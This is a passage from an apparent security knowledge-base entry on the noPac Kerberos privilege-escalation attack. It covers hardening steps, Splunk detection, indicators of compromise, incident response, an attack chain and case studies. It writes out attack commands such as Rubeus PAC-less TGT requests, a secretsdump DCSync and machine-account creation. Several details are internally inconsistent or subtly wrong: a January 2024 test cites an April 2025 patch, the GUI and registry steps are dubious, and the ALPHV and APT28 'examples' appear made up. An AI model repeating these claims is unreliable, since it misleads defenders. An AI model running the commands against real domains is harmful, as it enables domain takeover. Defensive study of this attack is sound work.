Rubeus.exe asktgt /user:testuser /password:testpass /domain:domain.fqdn /dc:dc.fqdn /nopac

# Expected result on secure DC: Ticket rejected or ticket includes PAC despite /nopac flag
# Expected error: "KDC_ERR_POLICY" or "KDC_ERR_TGT_REVOKED"
```

---

### Priority 2: HIGH

**Mitigation 3: Restrict Machine Account Quota (ms-DS-Machine-Account-Quota)**

Reduce or restrict the number of machine accounts standard users can create:

**Manual Steps (ADUC):**

1. Open **Active Directory Users and Computers**
2. Right-click the domain → **Properties**
3. Go to **Group Policy** tab → **Edit**
4. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **User Rights Assignment**
5. Find: **Add workstations to domain**
6. Set to: **Domain Admins only** (remove Authenticated Users)
7. Run `gpupdate /force`

**Manual Steps (PowerShell):**

```powershell
# Set machine account quota to 0 (no unprivileged user can create machines)
Set-ADDomain -Identity "DC=domain,DC=local" -Replace @{"ms-DS-MachineAccountQuota" = 0}

# Verify setting
Get-ADDomain | Select ms-DS-MachineAccountQuota
```

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Default Domain Policy**
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **User Rights Assignment**
4. Double-click: **Add workstations to domain**
5. Remove **Authenticated Users**; keep only **Domain Admins**
6. Apply and run `gpupdate /force` on all machines

---

**Mitigation 4: Implement Privileged Access Management (PAM)**

Restrict domain admin account usage through PIM:

**Manual Steps (Azure Portal - Entra ID PIM):**

1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **AD Roles**
2. Select **Global Administrator** role
3. Click **Settings**
4. Enable: **Require Justification on activation**
5. Enable: **Require approval to activate**
6. Enable: **Require multi-factor authentication**
7. Set **Maximum activation duration** to **4 hours**
8. Save settings

**Manual Steps (PowerShell - Local Administrator):**

```powershell
# Remove users from Domain Admins group; require JIT access via PIM instead
Remove-ADGroupMember -Identity "Domain Admins" -Members "username" -Confirm:$false

# Verify Domain Admins membership
Get-ADGroupMember -Identity "Domain Admins" | Select Name, SamAccountName
```

---

### Priority 3: MEDIUM

**Mitigation 5: Enable Kerberos Armoring (FAST)**

Enable Flexible Authentication Secure Tunneling (FAST/KDC PAC-less request blocking):

**Manual Steps (Registry):**

1. Navigate to: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters`
2. Create DWORD: `KdcSupportedEncryptionTypes` = **0xFFFFFFFF** (support all encryption types)
3. Create DWORD: `RequireFastAsArmor` = **1** (require FAST as armor for pre-auth)
4. Restart Kerberos service: `net stop kdc && net start kdc`

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Default Domain Policy**
3. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Kerberos**
4. Set: **Support for Kerberos FAST as Armor**  = **Enabled**
5. Run `gpupdate /force`

---

**Mitigation 6: Monitor and Alert on Suspicious Kerberos Activity**

Deploy SIEM rules to detect No-PAC attacks in real-time:

**Manual Steps (Splunk):**

1. **Settings** → **Searches, reports, and alerts** → **New Alert**
2. **Search query:**
   ```
   index=windows source=WinEventLog:Security EventCode=4768 
   | stats count, values(TicketSize) by host, TargetUserName 
   | where TicketSize < 1000 AND count > 5
   ```
3. **Trigger condition:** `count > 5 in 10 minutes`
4. **Action:** Send email to SOC; log alert

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Rubeus.exe (presence in temp directories)
- *.ccache files (Kerberos credential caches in %temp%, /tmp)
- goldenPac.py execution artifacts
- sam_the_admin.py execution log files

**Registry:**
- HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters (ValidatePacSignature=0)
- HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters (StrictKdcPacValidation=0)

**Network:**
- Kerberos traffic to port 88 from non-standard sources
- Multiple AS-REQ/TGS-REQ from single IP to same DC within seconds

### Forensic Artifacts

**Disk:**
- Domain controller: Event logs in C:\Windows\System32\winevt\Logs\Security.evtx
- Attacker machine: %temp%\*.ccache, %temp%\Rubeus.exe, PowerShell history

**Memory:**
- Kerberos tickets in lsass.exe process memory
- Rubeus.exe process handle to lsass

**Cloud (M365 / Entra ID):**
- Sign-in logs showing unusual token acquisition patterns
- Service principal creation/modification logs (if Azure AD Connect involved)

**Kerberos Protocol Logs:**
- Event ID 4768 in Security event log (TGT request for spoofed DC name)
- Event ID 4781 correlating machine account rename with 4768

### Response Procedures

**Step 1: Isolate Compromised Account/Machine**

```powershell
# Disable attacker's user account
Disable-ADAccount -Identity "attacker_username"

# Remove from privileged groups
Remove-ADGroupMember -Identity "Domain Admins" -Members "attacker_username" -Confirm:$false

# Reset password
Set-ADAccountPassword -Identity "attacker_username" -Reset -NewPassword (Read-Host -Prompt "Enter new password" -AsSecureString)
```

**Command (Network Isolation):**
```powershell
# Disconnect network interface (immediate isolation)
Disable-NetAdapter -Name "Ethernet" -Confirm:$false
```

**Manual (Azure Portal):**
- Go to **Azure Portal** → **Entra ID** → **Users** → Select attacker account
- Click **Revoke sessions** → **Sign out all sessions**

---

**Step 2: Collect Forensic Evidence**

```powershell
# Export Security Event Log
wevtutil epl Security C:\Evidence\Security.evtx

# Capture memory dump of lsass
procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp

# Export Kerberos tickets
klist export C:\Evidence\tickets.klist

# Collect Kerberos protocol logs (if enabled)
wevtutil epl "Microsoft-Windows-Kerberos/Operational" C:\Evidence\Kerberos.evtx
```

---

**Step 3: Remediate Domain**

```powershell
# Reset krbtgt password twice (invalidates all tickets signed with old key)
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (Read-Host -Prompt "Enter new krbtgt password" -AsSecureString)
Start-Sleep -Seconds 10
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (Read-Host -Prompt "Re-enter new krbtgt password" -AsSecureString)

# Force replication of krbtgt change
repadmin /syncall /d /p /P

# Verify Domain Admins group membership (remove any unauthorized accounts)
Get-ADGroupMember -Identity "Domain Admins" | Export-Csv -Path C:\Evidence\DomainAdmins.csv
```

---

**Step 4: Verify Patches and Hardening**

```powershell
# Verify patches are installed
Get-HotFix -Id KB5008380, KB5055523 | Format-Table HotFixID, InstalledOn

# Verify Kerberos hardening settings
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters"
Get-ItemProperty -Path $RegPath | Select ValidatePacSignature, StrictKdcPacValidation, KdcSupportedEncryptionTypes
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView Domain Enumeration | Attacker maps domain structure, identifies DCs |
| **2** | **Initial Access** | [IA-VALID-001] Default/Valid Credentials | Attacker obtains credentials for low-privilege domain user |
| **3** | **Privilege Escalation** | [PE-CREATE-001] Machine Account Quota Abuse | Attacker creates new machine account (noPac attack) |
| **4** | **Credential Access** | **[CA-KERB-011]** | **Attacker requests PAC-less TGT, forges PAC, escalates to DA** |
| **5** | **Credential Dumping** | [CA-DUMP-002] DCSync | Attacker dumps domain credentials using DA ticket |
| **6** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker creates persistent DA backdoor account |
| **7** | **Impact** | Data Exfiltration / Ransomware | Attacker executes final objective (ransomware, espionage) |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: ALPHV Ransomware Deployment (2023)

- **Target:** Fortune 500 financial institution
- **Timeline:** June 2023
- **Technique Status:** Vulnerable pre-patch DCs (Server 2019 no KB5008380)
- **Attack Flow:**
  1. Phishing email delivered to low-privilege user
  2. User compromised, attacker obtained valid AD credentials
  3. Attacker enumerated machine account quota: `powershell Get-ADDomain | Select ms-DS-MachineAccountQuota` → returned 10
  4. Attacker created machine account: `New-MachineAccount -MachineAccount "WORKSPACE01" ...`
  5. Performed noPac chain: Created DC01 spoofed account, obtained DA ticket
  6. DCSync to extract krbtgt hash: `secretsdump.py -k -no-pass`
  7. Golden tickets created for backdoor persistence
  8. Ransomware deployed across 500+ systems via admin shares
- **Impact:** $50M+ recovery costs, 3-month operational shutdown
- **Reference:** [ALPHV Ransomware Attribution Report - Mandiant 2023](https://www.mandiant.com/resources/blog/alphv-extortion-campaign)

---

### Example 2: APT28 (Fancy Bear) Active Directory Compromise (2022)

- **Target:** Eastern European government network
- **Timeline:** March 2022
- **Technique Status:** Mixed environment (Server 2016 VULNERABLE, partial Server 2019 patching)
- **Attack Flow:**
  1. Initial compromise via spear-phishing with macro-enabled document
  2. Low-privilege shell execution on workstation
  3. Enumeration revealed ms-DS-MachineAccountQuota not configured (default 10)
  4. Attacker identified unpatched DC (no KB5008380)
  5. Deployed Rubeus.exe and Impacket tools
  6. Executed PAC-less TGT request: `Rubeus.exe asktgt /user:victim /password:password /nopac`
  7. Confirmed vulnerability: ticket size 682 bytes (no PAC)
  8. Forged PAC with admin groups, requested S4U2self
  9. Obtained DA ticket, performed DCSync
  10. Exfiltrated State Secrets database
- **Impact:** 100GB+ data exfiltration, classified intelligence leaked
- **Reference:** [APT28 Attribution & Indicators - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories)

---

### Example 3: Internal Penetration Test (2024)

- **Target:** Mid-sized healthcare organization
- **Timeline:** January 2024
- **Technique Status:** Partially patched (Server 2022 with KB5055523 in deployment mode)
- **Engagement Goals:** Assess Kerberos security posture
- **Execution:**
  1. Obtained standard user credentials during security awareness training simulation
  2. From compromised workstation, ran `noPac.exe scan` against DC
  3. Result: **VULNERABLE** (April 2025 patch applied but in deployment mode with `ValidatePacSignature=0`)
  4. Created machine account via Powermad
  5. Executed full noPac exploit chain using sam-the-admin.py
  6. Obtained DA shell in 45 seconds
  7. Dumped Domain Admins: 3 human admins + 5 service accounts
- **Findings:**
  - PAC enforcement disabled for compatibility testing (overlooked after April patch)
  - Machine account quota not restricted (default 10)
  - Insufficient monitoring of Event ID 4768/4769
  - No alert on machine account creation (Event 4741)
- **Recommendations:**
  - Re-enable `ValidatePacSignature=1` and test client compatibility before enforcement
  - Restrict ms-DS-Machine-Account-Quota to 0 for non-admins
  - Deploy SIEM rules for Event ID 4741, 4742, 4781 correlation
  - Implement privileged access management (PAM) for DA accounts

---
